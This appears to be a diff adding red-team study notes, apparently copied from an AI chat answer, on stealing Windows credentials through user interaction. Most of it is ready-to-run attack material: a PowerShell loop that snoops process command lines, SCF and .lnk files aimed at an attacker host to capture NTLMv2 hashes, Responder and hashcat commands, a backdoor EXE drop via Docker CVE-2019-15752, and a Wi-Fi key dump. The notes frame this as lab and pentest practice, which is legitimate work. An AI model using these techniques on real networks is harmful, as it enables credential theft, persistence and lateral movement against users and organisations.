@@ -1,0 +1,130 @@
+ High-Level Summary
+This section focuses on leveraging user behavior and misconfigurations to elevate privileges or steal credentials. It's not necessarily about exploiting services — it's about sitting back, watching, planting traps, and collecting creds from users doing their thing.
+
+These techniques come in clutch:
+
+When you've exhausted privesc paths.
+
+During post-exploitation, to gain lateral movement or report impact.
+
+When working long-term engagements with persistence.
+
+✅ Got This? Do That (Workflow)
+🧩 Got This Situation	✅ Then Try This
+Suspect user activity / can't find privesc	Monitor running processes for creds in command-line
+Have access to shared folders	Drop SCF or LNK files to capture NTLMv2 hashes
+Found Wireshark installed	Start capturing to sniff creds (FTP, HTTP Basic, etc.)
+Docker Desktop pre-2.1.0.1 installed	Check for writable path to drop malicious exe (CVE-2019-15752)
+Have user access but want elevated access	Trigger user interaction with malicious LNK file to capture creds
+Have SMB share with write access	Plant malicious files and run Responder to capture hashes
+Have access to PowerShell or command shell	Run process command monitoring loop
+Doing long-term engagement	Let net-creds run in background or on pcap captures
+🧨 Tactics Explained
+🐍 1. Traffic Capture
+If Wireshark is installed and npcap is unrestricted → capture FTP, HTTP Basic, etc.
+
+You can use:
+
+powershell
+Copy
+Edit
+Start-Process Wireshark
+Or from attack box:
+
+bash
+Copy
+Edit
+sudo tcpdump -i eth0 -w capture.pcap
+📦 Tool: net-creds — parses live or recorded captures for creds.
+
+👀 2. Monitor Process Command Lines
+Users may unknowingly leak passwords in process command lines (common in backup scripts, net use commands, etc).
+
+One-liner:
+
+powershell
+Copy
+Edit
+while($true){ $a=Get-WmiObject Win32_Process | Select CommandLine; Start-Sleep 2; $b=Get-WmiObject Win32_Process | Select CommandLine; Compare-Object -ReferenceObject $a -DifferenceObject $b }
+Example find:
+
+perl
+Copy
+Edit
+net use T: \\sql02\backups /user:domain\sqlsvc My4dm1nP@s5w0Rd
+🐳 3. Docker Desktop CVE-2019-15752
+Path: C:\PROGRAMDATA\DockerDesktop\version-bin\
+
+If BUILTIN\Users can write here, and file like docker-credential-wincred.exe is missing → drop your malicious payload.
+
+It executes when:
+
+Docker restarts
+
+docker login is triggered by a user
+
+🛠️ Drop a backdoor EXE, wait for it to fire.
+
+📦 4. Malicious SCF File on Share
+If a user browses a directory with a specially crafted .scf, their system initiates SMB auth → Responder snags the hash.
+
+ini
+Copy
+Edit
+[Shell]
+Command=2
+IconFile=\\<attacker_ip>\share\legit.ico
+[Taskbar]
+Command=ToggleDesktop
+Run Responder:
+
+bash
+Copy
+Edit
+sudo responder -I tun0 -wrf
+Then crack it:
+
+bash
+Copy
+Edit
+hashcat -m 5600 hash.txt rockyou.txt
+🧲 5. Malicious .lnk Files
+Server 2019 blocks SCF-based leaks, so switch to .lnk (shortcut files).
+
+PowerShell to generate:
+
+powershell
+Copy
+Edit
+$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut("C:\legit.lnk")
+$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
+$lnk.Save()
+Drop that .lnk on a share, wait for user to hover/click/open.
+
+🧩 6. General User Interaction Attacks
+Think long-term. Once creds or tokens are captured:
+
+Use for lateral movement
+
+Use for SQL Server pivoting
+
+Use in report to show real-world impact of password hygiene or share misconfig
+
+🔥 One-Liners to Remember
+💻 Purpose	🔍 One-Liner
+Process command-line snooping	`while($true){ $a=Get-WmiObject Win32_Process
+Start Responder	sudo responder -I tun0 -wrf
+Hashcat NetNTLMv2 crack	hashcat -m 5600 captured.hash rockyou.txt
+Build malicious .lnk in PowerShell	See PowerShell script above
+View Wi-Fi passwords	netsh wlan show profile <SSID> key=clear
+💬 Final Thoughts
+You're absolutely right — this feels like a HTB box or THM room, but it's extremely real-world relevant. Enterprises absolutely use Citrix, Docker Desktop, and shared drives — and users absolutely still leak creds in real deployments.
+
+These techniques are:
+
+Optional in lab-based escalation paths
+
+Essential in actual red team or internal assessment reports
+
+Sometimes, just catching one leaked admin hash after hours of enumeration is the win that changes the game.
